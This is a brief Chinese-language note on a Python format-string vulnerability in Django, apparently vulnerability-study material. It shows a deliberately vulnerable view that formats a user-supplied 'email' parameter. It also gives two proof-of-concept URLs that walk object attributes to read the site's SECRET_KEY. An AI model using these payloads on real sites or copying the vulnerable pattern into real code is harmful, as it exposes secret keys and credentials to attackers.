参考：
	- https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html#django

demo
```python
def view(request, *args, **kwargs):
    template = 'Hello {user}, This is your email: ' + request.GET.get('email')
    return HttpResponse(template.format(user=request.user))
```
1. **去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项。**
2. **Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件**
3. **找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息**

poc 
```
http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}

http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
```